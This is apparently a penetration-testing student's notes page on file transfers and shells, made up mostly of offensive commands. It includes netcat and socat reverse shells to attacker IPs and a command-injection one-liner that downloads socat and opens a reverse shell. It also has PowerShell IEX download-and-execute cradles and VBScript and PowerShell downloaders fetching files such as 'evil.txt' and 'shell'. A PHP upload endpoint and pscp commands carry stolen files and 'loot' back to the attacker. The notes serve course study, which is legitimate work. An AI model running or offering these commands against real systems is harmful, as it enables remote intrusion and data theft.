# Module 16 (File Transfers)

## Generating reverse shell commands <a href="#generating-reverse-shell-commands" id="generating-reverse-shell-commands"></a>

attcker machen

```bash
nc -nvlp 4444 -e /bin/bash
```

victim

```bash
nc -nv 192.168.x.x 4444
```

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

### Upgrading the shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

#using arrows

#Ctrl + z
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## \*Linux to Windows

```bash
#from Linux to Windows
#Local
(new-object system.net.webclient).downloadstring('http://192.168.1.1/powerview.ps1') | IEX
#Remotly
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1') | IEX
```

## \*Windows to Linux <a href="#windows-to-linux" id="windows-to-linux"></a>

```bash
scp local_file username@hostname_or_ip:/remote/path
#Example
scp 20240830124156_BloodHound.zip kali@10.50.57.149:/var/www/uploads
```

## Method 1: Python pty module <a href="#method-1-python-pty-module" id="method-1-python-pty-module"></a>

One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'                                      
```

```bash
stty raw -echo
```

## Method 2: Using socat <a href="#method-2-using-socat" id="method-2-using-socat"></a>

[socat](http://www.dest-unreach.org/socat/doc/socat.html) is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.

If `socat` is installed on the victim server, you can launch a reverse shell with it. You _must_ catch the connection with `socat` as well to get the full functions.

The following commands will yield a fully interactive TTY reverse shell:

**On Kali (listen)**:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.10:4444
```

Windows File transfer

```bash
sudo apt update && sudo apt install pure-ftpd
```

### FTP configurations.

```bash
#!/bin/bash
if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root"
    exit
fi
sudo apt update && sudo apt install pure-ftpd
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd limbo -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

### FTPd file commands

```bash
echo open 192.168.1.10>> ftp.txt
echo USER hacktor>> ftp.txt
echo hacktor>> ftp.txt
echo bin>> ftp.txt
echo GET nc.exe>> ftp.txt
echo bye>> ftp.txt
```

\#How to run it

```bash
ftp -v -n -s:ftp.txt
```

\#Fixing time out problem\
Code:

```bash
echo "40110 40210" | sudo tee /etc/pure-ftpd/conf/PassivePortRange
sudo service pure-ftpd restart
```

### VBScript to download files

```visual-basic
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

#How to run it 
[code]

cscript wget.vbs http://192.168.1.10/evil.txt evil.txt
```

```bash
upx -9 nc.exe
sudo exe2hex -x  nc.exe  -p nc.cmd
```

### Power shell commands to download files

<pre class="language-powershell"><code class="lang-powershell">echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://192.168.1.10/shell" >>wget.ps1 
echo $file = "shell" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
[code]
#How to run it 
[code]
<strong>powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</strong>[code]

#Powersehll In one line 
[code]
<strong>powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.10/upload.php', 'pass.txt')
</strong>[code]

#On Fly command  --> Run powershell script without downloading it on the hard disk
[code]
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/hello.ps1')
[code]


#Uploading files 
#Preparing kali upload direcotry 
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
</code></pre>

### Save this php code into /var/www/html/

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

### This is how to use it

{% code overflow="wrap" %}
```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://10.9.0.213/upload.php', 'iexplore.DMP')
```
{% endcode %}

## Different methods to setup the server for file transfer

To perform the file transfer we need to setup a server, besides using **updog**.

```bash
updog -p 80
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd2qv5ieUJMsgL9sQva7HMIKCmJOZAhUhZODAit2mcxSZ2hfMnpbfm0dS3kphUB4lzRsN_ESov2ZP-y-1X0rR6LzNMzQbLx-P9qUfG8Js7SA7xUtjhAlgC1p7GPYSiVhGFXSJX0WADOIJuP_NWLL816B5cb22CHXbY7MkZC-sOS4DsP5-7-GU8rLDO3BtL/s16000/2.png" alt=""><figcaption></figcaption></figure>

### wget

We can use the wget command to transfer the file. **wget** is a powerful command to download files from the web. It should be noted that while doing file transfer using wget in windows, we need to mention the **-o** (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., **WebResponseObject**. The command for wget in windows is:

```
powershell wget http://192.168.1.8/ignite.txt -o ignite.txt -o ignite.txt
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFWdBQltBaUJTAtCOYfcBy_fCcC9edORpF2Z1TFZI-Gq_GunT8sy2utnIKca9YP-67ZV49XpjvodU84TXZoJaJSD3vfS0FWAp_VYNnqAjFKOWIlAKn02HDaKVzBAVSgA-tLCmoPRnh1aewVoxpcZ98VezBj0j_w49dhO-xiM43PCF9bdf_BwFLrmgky1A1/s16000/3.png" alt=""><figcaption></figcaption></figure>

### curl

Curl is a powerful command-line tool, which can be used to transfer files using various networking protocols. Following will be the command to transfer the file:

```bash
curl http://192.168.31.141/ignite.txt -o ignite.txt
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkMNrZZDFuJvd25DW03_tRiVd9TBl-r3yJoYJgWDpvzj9YRA7t6yzzydRZRW4HzxaMMfIDhaN4u8JXJuIXax0xLXGg5rUK_38D3L2p1LtVD_2Q-BOm9b7voyQsXk9_LfHVRmHuYwXLrd7dPwKziZcl7BDNQYZzBaSJDhcztpweGpGcaATXUxbrSGS_B_IU/s16000/4.png" alt=""><figcaption></figcaption></figure>

### To setup a server using **PHP**, we can use the following command:

```php
php -S 0.0.0.0:8081
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYvOOQLroJSIp_FgLy3uqgkQrInCQen8HhqInkolTxekU9LJCcahHk2KrYu2W0FUbsv47E9JI9rkFiJFzkCdmjzO1iKmTwaqKe-FtpAnaJrw2ZGkJwFNAFsuduyFeauo3aSZdqEQXoaJ0b0fgOj7grP5gbjfTsayFZNmqK_5dAOtWVCxIfSta8Z0VLztFw/s16000/60.png" alt=""><figcaption></figcaption></figure>

### To setup a server using **python2**, we can use the following command:

```python
python2 -m SimpleHTTPServer 80
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2gB0EhRBZRyJOng926oniYXXgZL1M2yHZJxrEcsSGx5UiPryr2-XAH7SzuVCmccq87hp907Gt6BW0b1Zu2onHl_Ty56QRpVBWjjLfUiUmYxkbJJDV1pFL_HZNk382_iXpaVhVgN2Zaq_zy9sKifwWGqFVgKb6c_b-Vl9I2R4b5J1bEMx6rvzB9-hyR4O-/s16000/61.png" alt=""><figcaption></figcaption></figure>

### To setup a server using **python3**, we can use the following command:

```python
python3 -m http.server 8000
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4y_VnJALVGhKZF5ak3RAxEoUFGt6cLlpX0R6ttoBy4_oZMaKtfOxaJp-1w9BWs1E6WG-HlTSWc5LnnjHV83_WVxsjkZreUDTdCuH2U56G0DhNiNGk2wqDyn438HoyktAlRb27zQTx69S48BCVqfRxqE4qnZlf2ExPpoLv9WscpnTwWzjANyCnoG7cteU1/s16000/62.png" alt=""><figcaption></figcaption></figure>

### File transfer using Netcat

Netcat, commonly known as **nc**, is a multifunctional networking tool designed for reading from and writing to network connections over TCP or UDP. Netcat can facilitate file transfers by establishing a simple client-server setup.

To transfer file in the kali machine from an Ubuntu machine we can use the following command inside kali:

```bash
nc -lvp 5555 > file.txt
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrEYjOpTYbrtwgv7KVe5eMJ4Qfk8ICdPJzQUlltKO2lkzgG2nAp4N1FZaioOdSCH3vkogEai1mKOhGqeAKN9D65RWIwLxRF27OLTZ2ZpFaE0fv3Vp3Jmh7dVCwE1_eZor0hrushOEBhxE5yYY1_8SDEuwTt_DYVGnSiUA3u6nScy3tK2N8p3DCeP4U8kPg/s16000/71.png" alt=""><figcaption></figcaption></figure>

Now wSimilarly, we can also receive files from a windows machine inside our kali linux. However, it should be noted that we the target windows machine should have the nc.exe binary to make this method work.

Following is the command we need to run on the windows machine:

```powershell
nc.exe 192.168.31.141 5555 < data.txt
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjzVyTrgfr4esOxQDfaVhP7QtyuCcWj5tYPG3Bzj646H8As3qIf8g1AtjvSUiRE07UvoqM9ojR5OaojlFI_0q5rXncAIuegubNwzzLICrpZI__EMQC973mahtaL7V0PUJ_JUhVdXCP7j9rSWIslfBnnoAjS40GRc2dVxEkEIdngrx3o8ag2rnfG313o8e/s16000/73.png" alt=""><figcaption></figcaption></figure>

To receive the file in the kali machine, we will run the following command:

```bash
nc -lvp 5555 > data.txt
cat data.txt
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6LU-K471evwFOeojlIiC0uJE84Wz0_3Z1oJcKP8h59pDfqQ2CEmpoj79KEs9G4Vxf-UhR4OR3SumX-nPUwbaBARiN6bLC520x8IOMnOuHFAbLe52HQTI0jFIkost4qII280ajayN66Dse9KTpjUTy_LzzhnYnvsMzxzFUuDokAG5O3bYQRegrQ2C_Uskw/s16000/74.png" alt=""><figcaption></figcaption></figure>

### PSCP  (Windows to linux)

{% code overflow="wrap" %}
```
sudo apt install putty-tools
sudo pscp Administrator@<IP_WIN>:/Users/Administrator/Downloads/20240806021013_loot.zip ~/PATH/To/Savefile-in_Lnux/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>
